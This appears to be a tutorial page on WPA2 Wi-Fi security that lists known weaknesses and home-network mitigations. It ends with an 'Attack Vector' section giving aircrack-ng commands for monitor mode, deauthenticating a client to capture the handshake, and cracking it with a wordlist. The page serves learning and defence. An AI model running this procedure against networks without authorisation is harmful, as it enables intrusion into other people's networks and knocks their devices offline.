WPA2 (Wi-Fi Protected Access 2) is a security protocol used to protect wireless networks. It was introduced as an improvement over the original WPA, addressing some of the vulnerabilities present in WPA.

WPA2 uses a stronger encryption algorithm called AES (Advanced Encryption Standard) instead of the TKIP (Temporal Key Integrity Protocol) used in WPA. This change significantly enhances the security of the wireless network.

#### Features
1. **Brute-Force Attacks:** Attackers may still attempt to guess the WPA2 pre-shared key (PSK) by trying all possible combinations until the correct key is found. A strong and complex passphrase can mitigate this risk.
2. **Dictionary Attacks:** Similar to brute-force attacks, dictionary attacks use a list of common passwords to try to guess the WPA2 key. Again, using a strong passphrase can help prevent this.
3. **KRACK Attack:** In 2017, a significant vulnerability called the Key Reinstallation Attack (KRACK) was discovered in WPA2. It allowed attackers to intercept and potentially manipulate data transmitted over the network. This vulnerability was in the WPA2 protocol itself and not in specific implementations.
4. **Rogue Access Points:** If an attacker sets up a rogue access point with the same SSID as a legitimate one, devices may unknowingly connect to the rogue AP, giving the attacker access to the network.
5. **Credential Sharing:** Weak password practices, such as sharing credentials with unauthorized individuals, can compromise the security of a WPA2 network.

#### Mitigation
1. **Use Strong and Unique Passwords:** Choose a long, complex, and unique pre-shared key (PSK) for your WPA2 network. Avoid using common words, phrases, or easily guessable information. Include a mix of uppercase and lowercase letters, numbers, and special characters.
2. **Enable WPA3 (if available):** If your devices and router support WPA3, consider upgrading to this newer and more secure Wi-Fi security protocol. WPA3 addresses some of the vulnerabilities found in WPA2 and provides additional security features.
3. **Regularly Update Firmware:** Keep your router's firmware up to date. Manufacturers release updates to patch known vulnerabilities and improve security. Check your router's manufacturer website or the router's administration interface for firmware updates.
4. **Disable WPS:** Wi-Fi Protected Setup (WPS) can be a potential vulnerability, so it's a good idea to disable it in your router's settings. WPS has known security issues, and disabling it prevents attackers from exploiting these weaknesses.
5. **Enable MAC Address Filtering:** Enable MAC address filtering on your router. This feature allows you to specify which devices are allowed to connect to the network based on their unique MAC addresses. While this is not foolproof, it adds an extra layer of security.
6. **Use a Guest Network:** If your router supports it, create a separate guest network for visitors. This isolates guest devices from your main network, protecting your sensitive data and devices.
7. **Regularly Review Connected Devices:** Periodically check the list of connected devices in your router's administration interface to ensure that only authorized devices are connected.
8. **Be Wary of Rogue Access Points:** Be cautious when connecting to public Wi-Fi networks, as attackers might set up rogue access points to intercept data. Whenever possible, use a Virtual Private Network (VPN) to encrypt your internet traffic.
9. **Educate Users:** Educate all users on your network about the importance of strong passwords and general Wi-Fi security practices. Discourage sharing Wi-Fi credentials with others and promote safe internet habits.
10. **Monitor Network Activity:** Use network monitoring tools to keep an eye on your network for any suspicious activities or unauthorized access attempts.

### Attack Vector
1. **Connect the Wireless Adaptor to the computer**
2. **Connect it to the virtual machine**
3. **Open it in Monitor Mode**
```bash
$ iwconfig
$ airmon-ng check kill
$ airmon-ng start wlan0
```
4. **Collect Data**
```bash
$ airodump-ng wlan0mon
$ airodump-ng -c 6 --bssid <Victim_MAC_Addr> -w capture wlan0mon
```
5. **Deauth Attack to capture the Handshake**
```bash
$ aireplay-ng -0 1 -a <Victim_MAC_Addr> -c <Station_MAC_Addr> wlan0mon
```
6. **Crack the Handshake to capture the wireless network password**
```bash
aircrack-ng -w wordlist.txt -b <Victim_Mac_Addr> capture-01.cap
```